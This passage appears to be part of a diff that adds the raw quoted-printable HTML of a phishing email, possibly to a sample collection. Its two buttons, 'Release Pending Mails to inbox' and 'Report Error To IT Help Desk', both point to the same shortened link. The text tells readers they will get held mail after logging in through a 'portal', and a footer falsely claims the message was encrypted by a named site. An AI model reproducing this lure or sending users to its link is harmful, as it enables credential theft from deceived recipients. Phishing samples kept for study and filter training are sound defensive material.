+: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: nor=
+mal; font-family: "Times New Roman"; font-size: medium; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
+ws: 2; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial; text-decoration-color: initial; font-varian=
+t-caps: normal; font-variant-ligatures: normal;'><li><a style=3D"background=
+: rgb(80, 110, 216); padding: 10px; border-radius: 2px; color: rgb(255, 255=
+, 255); text-decoration: underline; box-sizing: border-box; text-decoration=
+-line: none;" href=3D"https://spoo.me/9en4Mg" target=3D"_blank" rel=3D"nore=
+ferrer">Release Pending Mails to inbox</a><br><br>&nbsp;</li><li><a style=
+=3D"background: rgb(212, 0, 0); padding: 10px; border-radius: 2px; color: r=
+gb(255, 255, 255); text-decoration: underline; box-sizing: border-box; text=
+-decoration-line: none;" href=3D"https://spoo.me/9en4Mg" target=3D"_blank" =
+rel=3D"noreferrer">Report Error To IT Help Desk</a></li></ol><p style=3D'co=
+lor: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: =
+normal; font-family: "Times New Roman"; font-size: medium; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
+idows: 2; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
+l; text-decoration-style: initial; text-decoration-color: initial; font-var=
+iant-caps: normal; font-variant-ligatures: normal;'>&nbsp;</p><p style=3D'c=
+olor: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing:=
+ normal; font-family: "Times New Roman"; font-size: medium; font-style: nor=
+mal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; =
+widows: 2; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
+al; text-decoration-style: initial; text-decoration-color: initial; font-va=
+riant-caps: normal; font-variant-ligatures: normal;'><span style=3D"color: =
+rgb(0, 0, 0); font-family: Calibri; font-size: 14px;">You will receive pend=
+ing emails after successful login via portal as we apologize for the inconv=
+enience.</span></p><hr style=3D'color: rgb(0, 0, 0); text-transform: none; =
+text-indent: 0px; letter-spacing: normal; font-family: "Times New Roman"; f=
+ont-size: medium; font-style: normal; font-weight: 400; word-spacing: 0px; =
+white-space: normal; orphans: 2; widows: 2; -webkit-text-stroke-width: 0px;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial; font-variant-caps: normal; font-variant-ligatures=
+: normal;'><p style=3D'color: rgb(0, 0, 0); text-transform: none; text-inde=
+nt: 0px; letter-spacing: normal; font-family: "Times New Roman"; font-size:=
+ medium; font-style: normal; font-weight: 400; word-spacing: 0px; white-spa=
+ce: normal; orphans: 2; widows: 2; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial; font-variant-caps: normal; font-variant-ligatures: normal;=
+'><em>Message Encrypted by&nbsp;</em><span><span style=3D'color: rgb(0, 0, =
+0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-fa=
+mily: "Times New Roman"; font-size: medium; font-style: normal; font-weight=
+: 400; word-spacing: 0px; float: none; display: inline !important; white-sp=
+ace: normal; orphans: 2; widows: 2; -webkit-text-stroke-width: 0px; text-de=
+coration-thickness: initial; text-decoration-style: initial; text-decoratio=
+n-color: initial; font-variant-caps: normal; font-variant-ligatures: normal=
+;'>naukrimili.com</span>&nbsp;</span><em>&copy; All Rights Reserved.</em><s=
+pan>&nbsp;</span>| If you do not wish to recieve this message<span>&nbsp;</=
+span><span style=3D"color: rgb(84, 172, 210);">Unsubscribe.</span></p></bod=
+y></html>
